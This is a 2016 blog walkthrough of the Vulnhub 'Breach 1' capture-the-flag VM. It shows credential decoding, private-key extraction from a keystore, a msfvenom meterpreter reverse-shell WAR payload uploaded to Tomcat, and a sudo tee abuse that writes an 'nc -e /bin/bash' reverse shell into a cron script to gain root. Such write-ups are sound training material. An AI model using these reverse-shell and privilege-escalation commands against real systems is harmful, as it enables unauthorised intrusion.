---
layout: post
title:  "Vulnhub - Breach 1"
date:   2016-09-05 16:07:19
categories: [walkthrough]
comments: false
---
An Office Space themed VM [Breach 1](https://www.vulnhub.com/entry/breach-1,152/) written by [mrb3n](https://www.vulnhub.com/author/mrb3n,293/), sounded like a blast, and considering there were 2 in the series it seemd like something worth trying.

<!--more-->

## Description

First in a multi-part series, Breach 1.0 is meant to be beginner to intermediate boot2root/CTF challenge. Solving will take a combination of solid information gathering and persistence. Leave no stone unturned.

The VM is configured with a static IP address (192.168.110.140) so you will need to configure your host-only adaptor to this subnet.

Many thanks to knightmare and rastamouse for testing and providing feedback.

Shout-out to g0tmi1k for maintaining #vulnhub and hosting my first challenge.

If you run into any issues, you can find me on Twitter: https://twitter.com/mrb3n813 or on IRC in #vulnhub.

Looking forward to the write-ups, especially any unintended paths to local/root.

## Enumeration

As the VM is set to a static IP, we get to skip the host enumration phase and go straight into service enumeration.  However, an `nmap` scan is useless as everything shows up as open.  Lets try common ports.

![tcp80-index-php](/img/breach1/index.php.png)
{% highlight html %}
<!DOCTYPE html>
<html>
<head>
<title>Welcome to Breach 1.0</title>
</head>
<body bgcolor="#000000">
<font color="green">
<p>Initech was breached and the board of directors voted to bring in their internal Initech Cyber Consulting, LLP division to assist. Given the high profile nature of the breach and nearly catastrophic losses, there have been many subsequent attempts against the company. Initech has tasked their TOP consultants, led by Bill Lumbergh, CISSP and Peter Gibbons, C|EH, SEC+, NET+, A+ to contain and perform analysis on the breach.</p>
<p>Little did the company realize that the breach was not the work of skilled hackers, but a parting gift from a disgruntled former employee on his way out. The TOP consultants have been hard at work containing the breach.
However, their own work ethics and the mess left behind may be the company's downfall.</p>
<center><a href="initech.html" target="_blank"> <img src="/images/milton_beach.jpg"
width=500 height=500> </a></center>

<!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo ----->

</body>
</html>
{% endhighlight %}

Right off the bat, something interesting in the code.  Falls in line with what base64 would look like so lets give that a try.

{% highlight bash %}
root@kali:~/evidence/breach 1.0# echo Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo | base64 -d
cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh
root@kali:~/evidence/breach 1.0# echo Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo | base64 -d | base64 -d
pgibbons:damnitfeel$goodtobeagang$ta
root@kali:~/evidence/breach 1.0# -
{% endhighlight %}

`pgibbons:damnitfeel$goodtobeagang$ta` - Username and password I presume, but no where to use it just yet.

Lets do some scans against the HTTP host

## Nikto vs HTTP/80

{% highlight bash %}
root@kali:~/evidence/breach 1.0# nikto --host=http://192.168.110.140/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.140
+ Target Hostname:    192.168.110.140
+ Target Port:        80
+ Start Time:         2016-09-21 08:15:19 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x44a 0x534a04f49139d
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2016-09-21 08:15:39 (GMT-6) (20 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~/evidence/breach 1.0#
{% endhighlight %}

Nice, looks like `/images/` has an index.  Lets check that one out.

![images-index](/img/breach1/images-index.png)

Next step is to pull down all of the images on the page and run them through exiftool.

{% highlight bash %}
root@kali:~/evidence/breach1# exiftool bill.png
ExifTool Version Number         : 10.25
File Name                       : bill.png
Directory                       : .
File Size                       : 315 kB
File Modification Date/Time     : 2016:09:21 08:19:07-06:00
File Access Date/Time           : 2016:09:21 08:19:15-06:00
File Inode Change Date/Time     : 2016:09:21 08:19:14-06:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 610
Image Height                    : 327
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Comment                         : coffeestains
Image Size                      : 610x327
Megapixels                      : 0.199
root@kali:~/evidence/breach1# -
{% endhighlight %}

`bill.png` has an interesting comment of `coffeestains`, none of the others have any interesting exifdata.  Perhaps this is another password?

##  OWASP Dirbuster to the rescue

Not many more leads to go on, so its time to brute force some directories.  For that I swap between `dirb` and `dirbuster` depending my mood.  This time `dirbuster` is chosen as the tool.

![dirbuster](/img/breach1/dirbuster.png)

Almost right away Dirbuster finds `/impresscms/`, yay something to login to!  `pgibbons:damnitfeel$goodtobeagang$ta` is my first attempt.

![impresscms-pgibbons](/img/breach1/impresscms-pgibbons.png)

Time to pilfer everything we can.  First thing that catches my eye is the SSL implementation test capture listed on the page.

{% highlight text %}

SSL implementation test capture Edit Delete
Published by Peter Gibbons on 2016/6/4 21:37:05. (0 reads)
Team - I have uploaded a pcap file of our red team's re-production of the attack. I am not sure what trickery they were using but I cannot read the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. http://192.168.110.140/impresscms/_SSL_test_phase1.pcap They told me the alias, storepassword and keypassword are all set to 'tomcat'. Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I'm going fishing for the next 2 days and will not have access to email or phone.
{% endhighlight %}

Nice, a pcap and a keystore password of `tomcat`, lets go see if we find anything in the inbox.

{% highlight text %}
ImpressCMS Admin

Sent: 2016/6/13 22:35:55Posting sensitive content

Peter, yeahhh, I'm going to have to go ahead and ask you to have your team only post any sensitive artifacts to the admin portal. My password is extremely secure. If you could go ahead and tell them all that'd be great. -Bill
{% endhighlight %}

Excellent, we should keep looking for sensitive data.

{% highlight text %}
Michael Bolton

Sent: 2016/6/6 19:25:18IDS/IPS system

Hey Peter,
I got a really good deal on an IDS/IPS system from a vendor I met at that happy hour at Chotchkie's last week!
-Michael
{% endhighlight %}

Ok that explains the open ports thing, IDS ftl.

{% highlight bash %}
ImpressCMS Admin

Sent: 2016/6/4 14:40:26FWD: Thank you for your purchase of Super Secret Cert Pro!

Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob ------------------------------------------------------------------------------------------------------------------------------------------- From: registrar@penetrode.com Sent: 02 June 2016 16:16 To: bob@initech.com; admin@breach.local Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!
{% endhighlight %}

Nice! SSL cert is available, lets go grab that

{% highlight bash %}
root@kali:~/evidence/breach 1.0# file keystore
keystore: Java KeyStore
root@kali:~/evidence/breach 1.0#
{% endhighlight %}

Ok its a java keystore.  I don't know much about those but I find a good explination of them at http://security.stackexchange.com/questions/3779/how-can-i-export-my-private-key-from-a-java-keytool-keystore, which is enough for em to get by

{% highlight bash %}
root@kali:~/evidence/breach 1.0# keytool -importkeystore -srckeystore keystore -destkeystore keystore.p12 -deststoretype PKCS12 -srcalias tomcat
Enter destination keystore password:  
Keystore password is too short - must be at least 6 characters
Enter destination keystore password:  
Re-enter new password:
Enter source keystore password:  
root@kali:~/evidence/breach 1.0# openssl pkcs12 -in keystore.p12 -nodes -nocerts -out key.pem
Enter Import Password:
MAC verified OK
root@kali:~/evidence/breach 1.0# cat key.pem
Bag Attributes
    friendlyName: tomcat
    localKeyID: 54 69 6D 65 20 31 34 37 34 34 36 39 30 32 30 30 38 38
Key Attributes: <No Attributes>
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCjJXnELHvCEyTT
ZW/cJb7sFuwIUy5l5DkBXD9hBgRtpUSIv9he5RbJQwGuwyw5URbm3pa7z1eoRjFW
HLMVzKYte6AyyjUoWcc/Fs9fiu83+F0G36JmmFcxLFivVQwCHKhrajUc15i/XtCr
ExEDNL0igM8YnCPq4J9lXrXUanLltR464F7cJdLbkqHiqRvoFiOQi9e3CIZ86uoY
UNBupj2/njMFRuB7dEoeaQ/otHZIgCgjbP76I+/xyL/RkGxYuU0e1tpQiLxTi7kF
nJ1Rd55Gd+DvzuBiI9F+fxa4+TSQvRvQEzJIKowbPw6h82Cd66yFju8c2AKiaDie
F+AqVim3AgMBAAECggEBAIr2Ssdr1GY0hDODvUnY5MyXoahdobGsOVoNRvbPd0ol
cUDBl/0MSOJZLr+7Apo3lbhEdEO4kkOEtlVQ0MGKtSkcmhFo5updvjbgqPYKk0Qr
SqGmLuAQdoQt78Q4Pqg13MbRijfs8/BdRIPTE7SVYVxYNw4RQQ65EUv45gvuN7ur
shV5WSHVaN5QyUHyOTKcvFuBqxb9Mfo2NtRGZCG2QuG8V/C+k2k8+Q+n2wDaOXw8
sIWKVMHngOMcW1OBnM3ac/bTeI2+LI5cMsBZqYlLmkH1AOlnCgpH7389NbRQQJSo
sExX51v5r2mmI1JdzszwQYqRfH7+nugDRjBEN2ztqFECgYEA4eBiLFP9MeLhjti8
PDElSG4MVf/I9WXfLDU79hev7npRw8LE0rzPgawXOL8NhTbp8/X1D071bGaA3rCU
oBEEPclXlSwXHroZVjJALDhaPrIfFT6gBXlb9wAYSzWYED4LKXDuddVChrTo4Lmx
XaHb/KM7kpPuUWr+xccEEuNJBnMCgYEAuOduxGz2Ecd+nwATsZpjgG5/SwLL/rd0
TEMNQbB/XUIOI8mZpw5Dn1y71qCijk/A+oVzohc6Dspso4oXLMy0b+HCFPTKuGgg
Hf8QV5YbDg0urH8KNNEEH7Dx/C6cp6vVAcj6eQ2wOwW62yVY8gy2elWH0gte1BXl
hHiKIaLueq0CgYEAoAwi4+/7Ny7gzhvKfQgBt+mqOgGM/jzZvnRV8VDlayAm8YP/
fKcmjWZH6gCN7vdzHFcJ9nfnNJEI/UG3fhewnqscsOlV1ILe0xG2IN8pKsWBescu
EdLlFAZwMFJgVhnwRMPtY3bhtZtYa2uIPqUiwEdVPc4uDmi276LNwyhjJPsCgYA7
ANcO5TpMiB12vX6LURnpVNlX5WeVO5Nn9omXaavq5XY/o0hdz6ZyhxQFtDLLONX6
23T/x2umZp/uO9WTXStC/IaDS24ZFFkTWV4spOCzRi+bqdpm6j/noP5HG9SviJyr
Oif7Uwvmebibz7onWzkrpnl15Fz5Tpd0A0cI3sY87QKBgQDLZ9pl505OMHOyY6Xr
geszoeaj4cQrRF5MO2+ad81LT3yoLjZyARaJJMEAE7FZxPascemlg9KR3JPnevIU
3RdMGHX75yr92Sd8lNQvSO6RWUuRnc889xN1YrpPx5G1VppIFqTrcB0gAiREkeUA
pHiPhbocjixKJz9xx+pG0jDkrg==
-----END PRIVATE KEY-----
root@kali:~/evidence/breach 1.0# -
{% endhighlight %}

Horray! I love private keys.  Now to look at that SSL Test pcap.

![wireshark-ssl](/img/breach1/wireshark-ssl.png)
![wireshark](/img/breach1/wireshark.png)

Interesting url there of `/_M@nage3Me/html` will have to check that out.  We also get a Basic Authorization Digest.

{% highlight html %}
GET /_M@nag3Me/html HTTP/1.1
Host: 192.168.110.140:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: /impresscms/modules/profile/admin/category.php_mod_profile_Category_sortsel=cat_weight; /impresscms/modules/profile/admin/category.php_mod_profile_Category_ordersel=ASC; /impresscms/modules/profile/admin/category.php_limitsel=15; /impresscms/modules/profile/admin/category.php_mod_profile_Category_filtersel=default; /impresscms/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms/modules/profile/admin/field.php_limitsel=15; /impresscms/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_sortsel=step_name; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_ordersel=ASC; /impresscms/modules/profile/admin/regstep.php_limitsel=15; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_filtersel=default
Connection: keep-alive
Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC
{% endhighlight %}

{% highlight bash %}
root@kali:~/evidence/breach 1.0# echo dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC | base64 -d
tomcat:Tt\5D8F(#!*u=G)4m7zB
root@kali:~/evidence/breach 1.0#
{% endhighlight %}

Sweet another username, password and location to exploit.  And to top it off I think theres a metasploit module for tomcat =).

## Metasploit Well.. Sortof

Jumped into metasploit and tried a couple of modules out which I thought would have worked.  Perhaps I did somehting wrong in their configuration but I didn't really want to spend the time to figure it out.  `msfvenom` should be able to make me a payload and then I can just use the multi/handler to get access.

{% highlight bash %}
root@kali:~/evidence/breach 1.0# msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.110.139 LPORT=4444 -f war -o manager.war
Payload size: 6078 bytes
Final size of war file: 6078 bytes
Saved as: manager.war
root@kali:~/evidence/breach 1.0#
{% endhighlight %}

The package was then uploaded using Tomcat's `WAR file to deploy` feature. and upon going to `https://192.168.110.140:8443/manager/` we got meterpreter shell.

{% highlight bash %}
msf exploit(tomcat_mgr_deploy) > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD java/meterpreter/reverse_tcp
PAYLOAD => java/meterpreter/reverse_tcp
msf exploit(handler) > setg LHOST 192.168.110.139
LHOST => 192.168.110.139
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.110.139:4444
[*] Starting the payload handler...
[*] Sending stage (46089 bytes) to 192.168.110.140
[*] Meterpreter session 1 opened (192.168.110.139:4444 -> 192.168.110.140:57554) at 2016-09-22 02:26:44 -0600

meterpreter > sysinfo
Computer    : Breach
OS          : Linux 4.2.0-27-generic (amd64)
Meterpreter : java/linux
meterpreter > getuid
Server username: tomcat6
meterpreter >
{% endhighlight %}

Awesome, we have a meterpreter session.  Lets do some recon.

{% highlight bash %}
meterpreter > shell
Process 1 created.
Channel 1 created.
ls /home -alh
total 16K
drwxr-xr-x  4 root      root      4.0K Jun  4 19:24 .
drwxr-xr-x 22 root      root      4.0K Jun  4 09:56 ..
drwxr-xr-x  3 blumbergh blumbergh 4.0K Sep  6 10:24 blumbergh
drwxr-xr-x  3 milton    milton    4.0K Jun  6 15:34 milton
tail /etc/passwd
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash
tomcat6:x:104:112::/usr/share/tomcat6:/bin/false
colord:x:105:114:colord colour management daemon,,,:/var/lib/colord:/bin/false
mysql:x:106:116:MySQL Server,,,:/nonexistent:/bin/false
blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash
{% endhighlight %}

Looks like blumbergh has an account.  I wonder if that old `coffeestains` password works.  Of course we have a shell and not tty so lets get that TTY with a simple python command (first place I saw this command was on [netsec](http://netsec.ws/?p=337)) `python -c 'import pty; pty.spawn("/bin/sh")'`.

{% highlight bash %}
python -c 'import pty; pty.spawn("/bin/sh")'
$ id
id
uid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)
$ su blumbergh
su blumbergh
Password: coffeestains

blumbergh@Breach:/var/lib/tomcat6$ -
{% endhighlight %}

Success =).  Now for recon.  First off lets see if this account has any sudo prvis, those are alwasy nice =).

{% highlight bash %}
blumbergh@Breach:/var/lib/tomcat6$ sudo -l
sudo -l
Matching Defaults entries for blumbergh on Breach:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User blumbergh may run the following commands on Breach:
    (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
blumbergh@Breach:/var/lib/tomcat6$ -
{% endhighlight %}

Awesome, the user can run `/usr/bin/tee /usr/share/cleanup/tidyup.sh` hmm well how do we exploit this?  Well looking at the tee manpage we see the following:

{% highlight bash %}
TEE(1)                                     User Commands                                     TEE(1)

NAME
       tee - read from standard input and write to standard output and files

SYNOPSIS
       tee [OPTION]... [FILE]...

DESCRIPTION
       Copy standard input to each FILE, and also to standard output.
{% endhighlight %}

Awesome, so if we send STDIN into tee it should write to the '/usr/share/cleanup/tidyup.sh'

{% highlight bash %}
blumbergh@Breach:~$ cat /usr/share/cleanup/tidyup.sh
cat /usr/share/cleanup/tidyup.sh
#!/bin/bash

#Hacker Evasion Script
#Initech Cyber Consulting, LLC
#Peter Gibbons and Michael Bolton - 2016
#This script is set to run every 3 minutes as an additional defense measure against hackers.

cd /var/lib/tomcat6/webapps && find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf
blumbergh@Breach:~$ echo "nc -e /bin/bash 192.168.110.139 31337" > exploit.txt
blumbergh@Breach:~$ cat exploit.txt
nc -e /bin/bash 192.168.110.139 31337
blumbergh@Breach:~$ cat exploit.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
blumbergh@Breach:~$ cat /usr/share/cleanup/tidyup.sh
nc -e /bin/bash 192.168.110.139 31337
{% endhighlight %}

Now we wait with the listener setup on the attacker machine.

{% highlight bash %}
root@kali:~/evidence/breach# nc -lvv -p 31337
listening on [any] 31337 ...
192.168.110.140: inverse host lookup failed: Unknown host
connect to [192.168.110.139] from (UNKNOWN) [192.168.110.140] 42452
id
uid=0(root) gid=0(root) groups=0(root)
cd /root/
cat /root/.flag.txt
-----------------------------------------------------------------------------------

______                     _     __   _____      _____ _          _____          _
| ___ \                   | |   /  | |  _  |    |_   _| |        |  ___|        | |
| |_/ /_ __ ___  __ _  ___| |__ `| | | |/' |______| | | |__   ___| |__ _ __   __| |
| ___ \ '__/ _ \/ _` |/ __| '_ \ | | |  /| |______| | | '_ \ / _ \  __| '_ \ / _` |
| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |
\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|


-----------------------------------------------------------------------------------
Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!

Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.
{% endhighlight %}


## Final Thoughts

Overall I really enjoyed this and look forward to going on to Breach 2.1 in the near future.  Themeing was great and I learned quite a few things going through the challenge.
